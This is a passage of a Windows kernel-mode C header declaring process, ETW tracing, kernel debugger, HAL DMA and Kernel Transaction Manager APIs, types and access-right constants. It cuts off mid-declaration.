#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

/******************************************************************************
 *                          Process Manager Functions                         *
 ******************************************************************************/

NTKERNELAPI
NTSTATUS
NTAPI
PsWrapApcWow64Thread(
  IN OUT PVOID *ApcContext,
  IN OUT PVOID *ApcRoutine);

/*
 * PEPROCESS
 * PsGetCurrentProcess(VOID)
 */
#define PsGetCurrentProcess IoGetCurrentProcess

#if !defined(_PSGETCURRENTTHREAD_)
#define _PSGETCURRENTTHREAD_
FORCEINLINE
PETHREAD
NTAPI
PsGetCurrentThread(VOID)
{
  return (PETHREAD)KeGetCurrentThread();
}
#endif /* !_PSGETCURRENTTHREAD_ */


#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
NTSTATUS
NTAPI
PsCreateSystemThread(
  OUT PHANDLE ThreadHandle,
  IN ULONG DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN HANDLE ProcessHandle OPTIONAL,
  OUT PCLIENT_ID ClientId OPTIONAL,
  IN PKSTART_ROUTINE StartRoutine,
  IN PVOID StartContext OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
PsTerminateSystemThread(
  IN NTSTATUS ExitStatus);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */


/******************************************************************************
 *                          WMI Library Support Functions                     *
 ******************************************************************************/

#ifdef RUN_WPP
#if (NTDDI_VERSION >= NTDDI_WINXP)
NTKERNELAPI
NTSTATUS
__cdecl
WmiTraceMessage(
  IN TRACEHANDLE LoggerHandle,
  IN ULONG MessageFlags,
  IN LPGUID MessageGuid,
  IN USHORT MessageNumber,
  IN ...);
#endif
#endif /* RUN_WPP */

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
NTSTATUS
NTAPI
WmiQueryTraceInformation(
  IN TRACE_INFORMATION_CLASS TraceInformationClass,
  OUT PVOID TraceInformation,
  IN ULONG TraceInformationLength,
  OUT PULONG RequiredLength OPTIONAL,
  IN PVOID Buffer OPTIONAL);

#if 0
/* FIXME: Get va_list from where? */
NTKERNELAPI
NTSTATUS
NTAPI
WmiTraceMessageVa(
  IN TRACEHANDLE LoggerHandle,
  IN ULONG MessageFlags,
  IN LPGUID MessageGuid,
  IN USHORT MessageNumber,
  IN va_list MessageArgList);
#endif

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#ifndef TRACE_INFORMATION_CLASS_DEFINE

#if (NTDDI_VERSION >= NTDDI_WINXP)
NTKERNELAPI
NTSTATUS
NTAPI
WmiQueryTraceInformation(
  IN TRACE_INFORMATION_CLASS TraceInformationClass,
  OUT PVOID TraceInformation,
  IN ULONG TraceInformationLength,
  OUT PULONG RequiredLength OPTIONAL,
  IN PVOID Buffer OPTIONAL);
#endif

#define TRACE_INFORMATION_CLASS_DEFINE

#endif /* TRACE_INFOPRMATION_CLASS_DEFINE */

#if (NTDDI_VERSION >= NTDDI_VISTA)

NTSTATUS
NTKERNELAPI
NTAPI
EtwRegister(
  IN LPCGUID ProviderId,
  IN PETWENABLECALLBACK EnableCallback OPTIONAL,
  IN PVOID CallbackContext OPTIONAL,
  OUT PREGHANDLE RegHandle);

NTSTATUS
NTKERNELAPI
NTAPI
EtwUnregister(
  IN REGHANDLE RegHandle);

BOOLEAN
NTKERNELAPI
NTAPI
EtwEventEnabled(
  IN REGHANDLE RegHandle,
  IN PCEVENT_DESCRIPTOR EventDescriptor);

BOOLEAN
NTKERNELAPI
NTAPI
EtwProviderEnabled(
  IN REGHANDLE RegHandle,
  IN UCHAR Level,
  IN ULONGLONG Keyword);

NTSTATUS
NTKERNELAPI
NTAPI
EtwActivityIdControl(
  IN ULONG ControlCode,
  IN OUT LPGUID ActivityId);

NTSTATUS
NTKERNELAPI
NTAPI
EtwWrite(
  IN REGHANDLE RegHandle,
  IN PCEVENT_DESCRIPTOR EventDescriptor,
  IN LPCGUID ActivityId OPTIONAL,
  IN ULONG UserDataCount,
  IN PEVENT_DATA_DESCRIPTOR  UserData OPTIONAL);

NTSTATUS
NTKERNELAPI
NTAPI
EtwWriteTransfer(
  IN REGHANDLE RegHandle,
  IN PCEVENT_DESCRIPTOR EventDescriptor,
  IN LPCGUID ActivityId OPTIONAL,
  IN LPCGUID RelatedActivityId OPTIONAL,
  IN ULONG UserDataCount,
  IN PEVENT_DATA_DESCRIPTOR UserData OPTIONAL);

NTSTATUS
NTKERNELAPI
NTAPI
EtwWriteString(
  IN REGHANDLE RegHandle,
  IN UCHAR Level,
  IN ULONGLONG Keyword,
  IN LPCGUID ActivityId OPTIONAL,
  IN PCWSTR String);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WIN7)
NTSTATUS
NTKERNELAPI
NTAPI
EtwWriteEx(
  IN REGHANDLE RegHandle,
  IN PCEVENT_DESCRIPTOR EventDescriptor,
  IN ULONG64 Filter,
  IN ULONG Flags,
  IN LPCGUID ActivityId OPTIONAL,
  IN LPCGUID RelatedActivityId OPTIONAL,
  IN ULONG UserDataCount,
  IN PEVENT_DATA_DESCRIPTOR UserData OPTIONAL);
#endif



/******************************************************************************
 *                          Kernel Debugger Functions                         *
 ******************************************************************************/

#ifndef _DBGNT_

ULONG
__cdecl
DbgPrint(
  IN PCSTR Format,
  IN ...);

#if (NTDDI_VERSION >= NTDDI_WIN2K)
NTSYSAPI
ULONG
__cdecl
DbgPrintReturnControlC(
  IN PCCH Format,
  IN ...);
#endif

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTSYSAPI
ULONG
__cdecl
DbgPrintEx(
  IN ULONG ComponentId,
  IN ULONG Level,
  IN PCSTR Format,
  IN ...);

#ifdef _VA_LIST_DEFINED

NTSYSAPI
ULONG
NTAPI
vDbgPrintEx(
  IN ULONG ComponentId,
  IN ULONG Level,
  IN PCCH Format,
  IN va_list ap);

NTSYSAPI
ULONG
NTAPI
vDbgPrintExWithPrefix(
  IN PCCH Prefix,
  IN ULONG ComponentId,
  IN ULONG Level,
  IN PCCH Format,
  IN va_list ap);

#endif /* _VA_LIST_DEFINED */

NTSYSAPI
NTSTATUS
NTAPI
DbgQueryDebugFilterState(
  IN ULONG ComponentId,
  IN ULONG Level);

NTSYSAPI
NTSTATUS
NTAPI
DbgSetDebugFilterState(
  IN ULONG ComponentId,
  IN ULONG Level,
  IN BOOLEAN State);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_VISTA)

typedef VOID
(*PDEBUG_PRINT_CALLBACK)(
  IN PSTRING Output,
  IN ULONG ComponentId,
  IN ULONG Level);

NTSYSAPI
NTSTATUS
NTAPI
DbgSetDebugPrintCallback(
  IN PDEBUG_PRINT_CALLBACK DebugPrintCallback,
  IN BOOLEAN Enable);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#endif /* _DBGNT_ */

#if DBG

#define KdPrint(_x_) DbgPrint _x_
#define KdPrintEx(_x_) DbgPrintEx _x_
#define vKdPrintEx(_x_) vDbgPrintEx _x_
#define vKdPrintExWithPrefix(_x_) vDbgPrintExWithPrefix _x_
#define KdBreakPoint() DbgBreakPoint()
#define KdBreakPointWithStatus(s) DbgBreakPointWithStatus(s)

#else /* !DBG */

#define KdPrint(_x_)
#define KdPrintEx(_x_)
#define vKdPrintEx(_x_)
#define vKdPrintExWithPrefix(_x_)
#define KdBreakPoint()
#define KdBreakPointWithStatus(s)

#endif /* !DBG */

#if defined(__GNUC__)

extern NTKERNELAPI BOOLEAN KdDebuggerNotPresent;
extern NTKERNELAPI BOOLEAN KdDebuggerEnabled;
#define KD_DEBUGGER_ENABLED KdDebuggerEnabled
#define KD_DEBUGGER_NOT_PRESENT KdDebuggerNotPresent

#elif defined(_NTDDK_) || defined(_NTIFS_) || defined(_NTHAL_) || defined(_WDMDDK_) || defined(_NTOSP_)

extern NTKERNELAPI PBOOLEAN KdDebuggerNotPresent;
extern NTKERNELAPI PBOOLEAN KdDebuggerEnabled;
#define KD_DEBUGGER_ENABLED *KdDebuggerEnabled
#define KD_DEBUGGER_NOT_PRESENT *KdDebuggerNotPresent

#else

extern BOOLEAN KdDebuggerNotPresent;
extern BOOLEAN KdDebuggerEnabled;
#define KD_DEBUGGER_ENABLED KdDebuggerEnabled
#define KD_DEBUGGER_NOT_PRESENT KdDebuggerNotPresent

#endif

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
NTSTATUS
NTAPI
KdDisableDebugger(VOID);

NTKERNELAPI
NTSTATUS
NTAPI
KdEnableDebugger(VOID);

#if (_MSC_FULL_VER >= 150030729) && !defined(IMPORT_NATIVE_DBG_BREAK)
#define DbgBreakPoint __debugbreak
#else
VOID
NTAPI
DbgBreakPoint(VOID);
#endif

NTSYSAPI
VOID
NTAPI
DbgBreakPointWithStatus(
  IN ULONG Status);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WS03)
NTKERNELAPI
BOOLEAN
NTAPI
KdRefreshDebuggerNotPresent(VOID);
#endif

#if (NTDDI_VERSION >= NTDDI_WS03SP1)
NTKERNELAPI
NTSTATUS
NTAPI
KdChangeOption(
  IN KD_OPTION Option,
  IN ULONG InBufferBytes OPTIONAL,
  IN PVOID InBuffer,
  IN ULONG OutBufferBytes OPTIONAL,
  OUT PVOID OutBuffer,
  OUT PULONG OutBufferNeeded OPTIONAL);
#endif
/* Hardware Abstraction Layer Functions */

#if (NTDDI_VERSION >= NTDDI_WIN2K)

#if defined(USE_DMA_MACROS) && !defined(_NTHAL_) && (defined(_NTDDK_) || defined(_NTDRIVER_)) || defined(_WDM_INCLUDED_)

FORCEINLINE
PVOID
NTAPI
HalAllocateCommonBuffer(
  IN PDMA_ADAPTER DmaAdapter,
  IN ULONG Length,
  OUT PPHYSICAL_ADDRESS LogicalAddress,
  IN BOOLEAN CacheEnabled)
{
  PALLOCATE_COMMON_BUFFER allocateCommonBuffer;
  PVOID commonBuffer;

  allocateCommonBuffer = *(DmaAdapter)->DmaOperations->AllocateCommonBuffer;
  ASSERT( allocateCommonBuffer != NULL );
  commonBuffer = allocateCommonBuffer( DmaAdapter, Length, LogicalAddress, CacheEnabled );
  return commonBuffer;
}

FORCEINLINE
VOID
NTAPI
HalFreeCommonBuffer(
  IN PDMA_ADAPTER DmaAdapter,
  IN ULONG Length,
  IN PHYSICAL_ADDRESS LogicalAddress,
  IN PVOID VirtualAddress,
  IN BOOLEAN CacheEnabled)
{
  PFREE_COMMON_BUFFER freeCommonBuffer;

  freeCommonBuffer = *(DmaAdapter)->DmaOperations->FreeCommonBuffer;
  ASSERT( freeCommonBuffer != NULL );
  freeCommonBuffer( DmaAdapter, Length, LogicalAddress, VirtualAddress, CacheEnabled );
}

FORCEINLINE
ULONG
NTAPI
HalReadDmaCounter(
  IN PDMA_ADAPTER DmaAdapter)
{
  PREAD_DMA_COUNTER readDmaCounter;
  ULONG counter;

  readDmaCounter = *(DmaAdapter)->DmaOperations->ReadDmaCounter;
  ASSERT( readDmaCounter != NULL );
  counter = readDmaCounter( DmaAdapter );
  return counter;
}

FORCEINLINE
ULONG
HalGetDmaAlignment(
  IN PDMA_ADAPTER DmaAdapter)
{
  PGET_DMA_ALIGNMENT getDmaAlignment;
  ULONG alignment;

  getDmaAlignment = *(DmaAdapter)->DmaOperations->GetDmaAlignment;
  ASSERT( getDmaAlignment != NULL );
  alignment = getDmaAlignment( DmaAdapter );
  return alignment;
}

#endif /* USE_DMA_MACROS ... */

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#ifndef _NTTMAPI_
#define _NTTMAPI_

#include <ktmtypes.h>

#define TRANSACTIONMANAGER_QUERY_INFORMATION     (0x0001)
#define TRANSACTIONMANAGER_SET_INFORMATION       (0x0002)
#define TRANSACTIONMANAGER_RECOVER               (0x0004)
#define TRANSACTIONMANAGER_RENAME                (0x0008)
#define TRANSACTIONMANAGER_CREATE_RM             (0x0010)
#define TRANSACTIONMANAGER_BIND_TRANSACTION      (0x0020)

#define TRANSACTIONMANAGER_GENERIC_READ            (STANDARD_RIGHTS_READ            |\
                                                    TRANSACTIONMANAGER_QUERY_INFORMATION)

#define TRANSACTIONMANAGER_GENERIC_WRITE           (STANDARD_RIGHTS_WRITE           |\
                                                    TRANSACTIONMANAGER_SET_INFORMATION     |\
                                                    TRANSACTIONMANAGER_RECOVER             |\
                                                    TRANSACTIONMANAGER_RENAME              |\
                                                    TRANSACTIONMANAGER_CREATE_RM)

#define TRANSACTIONMANAGER_GENERIC_EXECUTE         (STANDARD_RIGHTS_EXECUTE)

#define TRANSACTIONMANAGER_ALL_ACCESS              (STANDARD_RIGHTS_REQUIRED        |\
                                                    TRANSACTIONMANAGER_GENERIC_READ        |\
                                                    TRANSACTIONMANAGER_GENERIC_WRITE       |\
                                                    TRANSACTIONMANAGER_GENERIC_EXECUTE     |\
                                                    TRANSACTIONMANAGER_BIND_TRANSACTION)

#define TRANSACTION_QUERY_INFORMATION     (0x0001)
#define TRANSACTION_SET_INFORMATION       (0x0002)
#define TRANSACTION_ENLIST                (0x0004)
#define TRANSACTION_COMMIT                (0x0008)
#define TRANSACTION_ROLLBACK              (0x0010)
#define TRANSACTION_PROPAGATE             (0x0020)
#define TRANSACTION_RIGHT_RESERVED1       (0x0040)

#define TRANSACTION_GENERIC_READ            (STANDARD_RIGHTS_READ            |\
                                             TRANSACTION_QUERY_INFORMATION   |\
                                             SYNCHRONIZE)

#define TRANSACTION_GENERIC_WRITE           (STANDARD_RIGHTS_WRITE           |\
                                             TRANSACTION_SET_INFORMATION     |\
                                             TRANSACTION_COMMIT              |\
                                             TRANSACTION_ENLIST              |\
                                             TRANSACTION_ROLLBACK            |\
                                             TRANSACTION_PROPAGATE           |\
                                             SYNCHRONIZE)

#define TRANSACTION_GENERIC_EXECUTE         (STANDARD_RIGHTS_EXECUTE         |\
                                             TRANSACTION_COMMIT              |\
                                             TRANSACTION_ROLLBACK            |\
                                             SYNCHRONIZE)

#define TRANSACTION_ALL_ACCESS              (STANDARD_RIGHTS_REQUIRED        |\
                                             TRANSACTION_GENERIC_READ        |\
                                             TRANSACTION_GENERIC_WRITE       |\
                                             TRANSACTION_GENERIC_EXECUTE)

#define TRANSACTION_RESOURCE_MANAGER_RIGHTS (TRANSACTION_GENERIC_READ        |\
                                             STANDARD_RIGHTS_WRITE           |\
                                             TRANSACTION_SET_INFORMATION     |\
                                             TRANSACTION_ENLIST              |\
                                             TRANSACTION_ROLLBACK            |\
                                             TRANSACTION_PROPAGATE           |\
                                             SYNCHRONIZE)

#define RESOURCEMANAGER_QUERY_INFORMATION        (0x0001)
#define RESOURCEMANAGER_SET_INFORMATION          (0x0002)
#define RESOURCEMANAGER_RECOVER                  (0x0004)
#define RESOURCEMANAGER_ENLIST                   (0x0008)
#define RESOURCEMANAGER_GET_NOTIFICATION         (0x0010)
#define RESOURCEMANAGER_REGISTER_PROTOCOL        (0x0020)
#define RESOURCEMANAGER_COMPLETE_PROPAGATION     (0x0040)

#define RESOURCEMANAGER_GENERIC_READ        (STANDARD_RIGHTS_READ                 |\
                                             RESOURCEMANAGER_QUERY_INFORMATION    |\
                                             SYNCHRONIZE)

#define RESOURCEMANAGER_GENERIC_WRITE       (STANDARD_RIGHTS_WRITE                |\
                                             RESOURCEMANAGER_SET_INFORMATION      |\
                                             RESOURCEMANAGER_RECOVER              |\
                                             RESOURCEMANAGER_ENLIST               |\
                                             RESOURCEMANAGER_GET_NOTIFICATION     |\
                                             RESOURCEMANAGER_REGISTER_PROTOCOL    |\
                                             RESOURCEMANAGER_COMPLETE_PROPAGATION |\
                                             SYNCHRONIZE)

#define RESOURCEMANAGER_GENERIC_EXECUTE     (STANDARD_RIGHTS_EXECUTE              |\
                                             RESOURCEMANAGER_RECOVER              |\
                                             RESOURCEMANAGER_ENLIST               |\
                                             RESOURCEMANAGER_GET_NOTIFICATION     |\
                                             RESOURCEMANAGER_COMPLETE_PROPAGATION |\
                                             SYNCHRONIZE)

#define RESOURCEMANAGER_ALL_ACCESS          (STANDARD_RIGHTS_REQUIRED             |\
                                             RESOURCEMANAGER_GENERIC_READ         |\
                                             RESOURCEMANAGER_GENERIC_WRITE        |\
                                             RESOURCEMANAGER_GENERIC_EXECUTE)

#define ENLISTMENT_QUERY_INFORMATION             (0x0001)
#define ENLISTMENT_SET_INFORMATION               (0x0002)
#define ENLISTMENT_RECOVER                       (0x0004)
#define ENLISTMENT_SUBORDINATE_RIGHTS            (0x0008)
#define ENLISTMENT_SUPERIOR_RIGHTS               (0x0010)

#define ENLISTMENT_GENERIC_READ        (STANDARD_RIGHTS_READ           |\
                                        ENLISTMENT_QUERY_INFORMATION)

#define ENLISTMENT_GENERIC_WRITE       (STANDARD_RIGHTS_WRITE          |\
                                        ENLISTMENT_SET_INFORMATION     |\
                                        ENLISTMENT_RECOVER             |\
                                        ENLISTMENT_SUBORDINATE_RIGHTS  |\
                                        ENLISTMENT_SUPERIOR_RIGHTS)

#define ENLISTMENT_GENERIC_EXECUTE     (STANDARD_RIGHTS_EXECUTE        |\
                                        ENLISTMENT_RECOVER             |\
                                        ENLISTMENT_SUBORDINATE_RIGHTS  |\
                                        ENLISTMENT_SUPERIOR_RIGHTS)

#define ENLISTMENT_ALL_ACCESS          (STANDARD_RIGHTS_REQUIRED       |\
                                        ENLISTMENT_GENERIC_READ        |\
                                        ENLISTMENT_GENERIC_WRITE       |\
                                        ENLISTMENT_GENERIC_EXECUTE)

typedef enum _TRANSACTION_OUTCOME {
  TransactionOutcomeUndetermined = 1,
  TransactionOutcomeCommitted,
  TransactionOutcomeAborted,
} TRANSACTION_OUTCOME;


typedef enum _TRANSACTION_STATE {
  TransactionStateNormal = 1,
  TransactionStateIndoubt,
  TransactionStateCommittedNotify,
} TRANSACTION_STATE;


typedef struct _TRANSACTION_BASIC_INFORMATION {
  GUID TransactionId;
  ULONG State;
  ULONG Outcome;
} TRANSACTION_BASIC_INFORMATION, *PTRANSACTION_BASIC_INFORMATION;

typedef struct _TRANSACTIONMANAGER_BASIC_INFORMATION {
  GUID TmIdentity;
  LARGE_INTEGER VirtualClock;
} TRANSACTIONMANAGER_BASIC_INFORMATION, *PTRANSACTIONMANAGER_BASIC_INFORMATION;

typedef struct _TRANSACTIONMANAGER_LOG_INFORMATION {
  GUID LogIdentity;
} TRANSACTIONMANAGER_LOG_INFORMATION, *PTRANSACTIONMANAGER_LOG_INFORMATION;

typedef struct _TRANSACTIONMANAGER_LOGPATH_INFORMATION {
  ULONG LogPathLength;
  WCHAR LogPath[1];
} TRANSACTIONMANAGER_LOGPATH_INFORMATION, *PTRANSACTIONMANAGER_LOGPATH_INFORMATION;

typedef struct _TRANSACTIONMANAGER_RECOVERY_INFORMATION {
  ULONGLONG LastRecoveredLsn;
} TRANSACTIONMANAGER_RECOVERY_INFORMATION, *PTRANSACTIONMANAGER_RECOVERY_INFORMATION;

typedef struct _TRANSACTION_PROPERTIES_INFORMATION {
  ULONG IsolationLevel;
  ULONG IsolationFlags;
  LARGE_INTEGER Timeout;
  ULONG Outcome;
  ULONG DescriptionLength;
  WCHAR Description[1];
} TRANSACTION_PROPERTIES_INFORMATION, *PTRANSACTION_PROPERTIES_INFORMATION;

typedef struct _TRANSACTION_BIND_INFORMATION {
  HANDLE TmHandle;
} TRANSACTION_BIND_INFORMATION, *PTRANSACTION_BIND_INFORMATION;

typedef struct _TRANSACTION_ENLISTMENT_PAIR {
  GUID EnlistmentId;
  GUID ResourceManagerId;
} TRANSACTION_ENLISTMENT_PAIR, *PTRANSACTION_ENLISTMENT_PAIR;

typedef struct _TRANSACTION_ENLISTMENTS_INFORMATION {
  ULONG NumberOfEnlistments;
  TRANSACTION_ENLISTMENT_PAIR EnlistmentPair[1];
} TRANSACTION_ENLISTMENTS_INFORMATION, *PTRANSACTION_ENLISTMENTS_INFORMATION;

typedef struct _TRANSACTION_SUPERIOR_ENLISTMENT_INFORMATION {
  TRANSACTION_ENLISTMENT_PAIR SuperiorEnlistmentPair;
} TRANSACTION_SUPERIOR_ENLISTMENT_INFORMATION, *PTRANSACTION_SUPERIOR_ENLISTMENT_INFORMATION;

typedef struct _RESOURCEMANAGER_BASIC_INFORMATION {
  GUID ResourceManagerId;
  ULONG DescriptionLength;
  WCHAR Description[1];
} RESOURCEMANAGER_BASIC_INFORMATION, *PRESOURCEMANAGER_BASIC_INFORMATION;

typedef struct _RESOURCEMANAGER_COMPLETION_INFORMATION {
  HANDLE IoCompletionPortHandle;
  ULONG_PTR CompletionKey;
} RESOURCEMANAGER_COMPLETION_INFORMATION, *PRESOURCEMANAGER_COMPLETION_INFORMATION;

typedef enum _KTMOBJECT_TYPE {
  KTMOBJECT_TRANSACTION,
  KTMOBJECT_TRANSACTION_MANAGER,
  KTMOBJECT_RESOURCE_MANAGER,
  KTMOBJECT_ENLISTMENT,
  KTMOBJECT_INVALID
} KTMOBJECT_TYPE, *PKTMOBJECT_TYPE;

typedef struct _KTMOBJECT_CURSOR {
  GUID LastQuery;
  ULONG ObjectIdCount;
  GUID ObjectIds[1];
} KTMOBJECT_CURSOR, *PKTMOBJECT_CURSOR;

typedef enum _TRANSACTION_INFORMATION_CLASS {
  TransactionBasicInformation,
  TransactionPropertiesInformation,
  TransactionEnlistmentInformation,
  TransactionSuperiorEnlistmentInformation
} TRANSACTION_INFORMATION_CLASS;

typedef enum _TRANSACTIONMANAGER_INFORMATION_CLASS {
  TransactionManagerBasicInformation,
  TransactionManagerLogInformation,
  TransactionManagerLogPathInformation,
  TransactionManagerRecoveryInformation = 4
} TRANSACTIONMANAGER_INFORMATION_CLASS;

typedef enum _RESOURCEMANAGER_INFORMATION_CLASS {
  ResourceManagerBasicInformation,
  ResourceManagerCompletionInformation,
} RESOURCEMANAGER_INFORMATION_CLASS;

typedef struct _ENLISTMENT_BASIC_INFORMATION {
  GUID EnlistmentId;
  GUID TransactionId;
  GUID ResourceManagerId;
} ENLISTMENT_BASIC_INFORMATION, *PENLISTMENT_BASIC_INFORMATION;

typedef struct _ENLISTMENT_CRM_INFORMATION {
  GUID CrmTransactionManagerId;
  GUID CrmResourceManagerId;
  GUID CrmEnlistmentId;
} ENLISTMENT_CRM_INFORMATION, *PENLISTMENT_CRM_INFORMATION;

typedef enum _ENLISTMENT_INFORMATION_CLASS {
  EnlistmentBasicInformation,
  EnlistmentRecoveryInformation,
  EnlistmentCrmInformation
} ENLISTMENT_INFORMATION_CLASS;

typedef struct _TRANSACTION_LIST_ENTRY {
/* UOW is typedef'ed as GUID just above.  Changed type of UOW
 * member from UOW to GUID for C++ compat.  Using ::UOW for C++
 * works too but we were reported some problems in corner cases
 */
  GUID UOW;
} TRANSACTION_LIST_ENTRY, *PTRANSACTION_LIST_ENTRY;

typedef struct _TRANSACTION_LIST_INFORMATION {
  ULONG NumberOfTransactions;
  TRANSACTION_LIST_ENTRY TransactionInformation[1];
} TRANSACTION_LIST_INFORMATION, *PTRANSACTION_LIST_INFORMATION;

typedef NTSTATUS
(NTAPI *PFN_NT_CREATE_TRANSACTION)(
  OUT PHANDLE TransactionHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN LPGUID Uow OPTIONAL,
  IN HANDLE TmHandle OPTIONAL,
  IN ULONG CreateOptions OPTIONAL,
  IN ULONG IsolationLevel OPTIONAL,
  IN ULONG IsolationFlags OPTIONAL,
  IN PLARGE_INTEGER Timeout OPTIONAL,
  IN PUNICODE_STRING Description OPTIONAL);

typedef NTSTATUS
(NTAPI *PFN_NT_OPEN_TRANSACTION)(
  OUT PHANDLE TransactionHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN LPGUID Uow OPTIONAL,
  IN HANDLE TmHandle OPTIONAL);

typedef NTSTATUS
(NTAPI *PFN_NT_QUERY_INFORMATION_TRANSACTION)(
  IN HANDLE TransactionHandle,
  IN TRANSACTION_INFORMATION_CLASS TransactionInformationClass,
  OUT PVOID TransactionInformation,
  IN ULONG TransactionInformationLength,
  OUT PULONG ReturnLength OPTIONAL);

typedef NTSTATUS
(NTAPI *PFN_NT_SET_INFORMATION_TRANSACTION)(
  IN HANDLE TransactionHandle,
  IN TRANSACTION_INFORMATION_CLASS TransactionInformationClass,
  IN PVOID TransactionInformation,
  IN ULONG TransactionInformationLength);

typedef NTSTATUS
(NTAPI *PFN_NT_COMMIT_TRANSACTION)(
  IN HANDLE TransactionHandle,
  IN BOOLEAN Wait);

typedef NTSTATUS
(NTAPI *PFN_NT_ROLLBACK_TRANSACTION)(
  IN HANDLE TransactionHandle,
  IN BOOLEAN Wait);

#if (NTDDI_VERSION >= NTDDI_VISTA)

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateTransactionManager(
  OUT PHANDLE TmHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN PUNICODE_STRING LogFileName OPTIONAL,
  IN ULONG CreateOptions OPTIONAL,
  IN ULONG CommitStrength OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtOpenTransactionManager(
  OUT PHANDLE TmHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN PUNICODE_STRING LogFileName OPTIONAL,
  IN LPGUID TmIdentity OPTIONAL,
  IN ULONG OpenOptions OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRenameTransactionManager(
  IN PUNICODE_STRING LogFileName,
  IN LPGUID ExistingTransactionManagerGuid);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRollforwardTransactionManager(
  IN HANDLE TransactionManagerHandle,
  IN PLARGE_INTEGER TmVirtualClock OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRecoverTransactionManager(
  IN HANDLE TransactionManagerHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationTransactionManager(
  IN HANDLE TransactionManagerHandle,
  IN TRANSACTIONMANAGER_INFORMATION_CLASS TransactionManagerInformationClass,
  OUT PVOID TransactionManagerInformation,
  IN ULONG TransactionManagerInformationLength,
  OUT PULONG ReturnLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetInformationTransactionManager(
  IN HANDLE TmHandle OPTIONAL,
  IN TRANSACTIONMANAGER_INFORMATION_CLASS TransactionManagerInformationClass,
  IN PVOID TransactionManagerInformation,
  IN ULONG TransactionManagerInformationLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtEnumerateTransactionObject(
  IN HANDLE RootObjectHandle OPTIONAL,
  IN KTMOBJECT_TYPE QueryType,
  IN OUT PKTMOBJECT_CURSOR ObjectCursor,
  IN ULONG ObjectCursorLength,
  OUT PULONG ReturnLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateTransaction(
  OUT PHANDLE TransactionHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN LPGUID Uow OPTIONAL,
  IN HANDLE TmHandle OPTIONAL,
  IN ULONG CreateOptions OPTIONAL,
  IN ULONG IsolationLevel OPTIONAL,
  IN ULONG IsolationFlags OPTIONAL,
  IN PLARGE_INTEGER Timeout OPTIONAL,
  IN PUNICODE_STRING Description OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtOpenTransaction(
  OUT PHANDLE TransactionHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN LPGUID Uow,
  IN HANDLE TmHandle OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationTransaction(
  IN HANDLE TransactionHandle,
  IN TRANSACTION_INFORMATION_CLASS TransactionInformationClass,
  OUT PVOID TransactionInformation,
  IN ULONG TransactionInformationLength,
  OUT PULONG ReturnLength OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetInformationTransaction(
  IN HANDLE TransactionHandle,
  IN TRANSACTION_INFORMATION_CLASS TransactionInformationClass,
  IN PVOID TransactionInformation,
  IN ULONG TransactionInformationLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCommitTransaction(
  IN HANDLE TransactionHandle,
  IN BOOLEAN Wait);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRollbackTransaction(
  IN HANDLE TransactionHandle,
  IN BOOLEAN Wait);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateEnlistment(
  OUT PHANDLE EnlistmentHandle,
  IN ACCESS_MASK DesiredAccess,
  IN HANDLE ResourceManagerHandle,
  IN HANDLE TransactionHandle,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN ULONG CreateOptions OPTIONAL,
  IN NOTIFICATION_MASK NotificationMask,
  IN PVOID EnlistmentKey OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtOpenEnlistment(
  OUT PHANDLE EnlistmentHandle,
  IN ACCESS_MASK DesiredAccess,
  IN HANDLE ResourceManagerHandle,
  IN LPGUID EnlistmentGuid,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationEnlistment(
  IN HANDLE EnlistmentHandle,
  IN ENLISTMENT_INFORMATION_CLASS EnlistmentInformationClass,
  OUT PVOID EnlistmentInformation,
  IN ULONG EnlistmentInformationLength,
  OUT PULONG ReturnLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetInformationEnlistment(
  IN HANDLE EnlistmentHandle OPTIONAL,
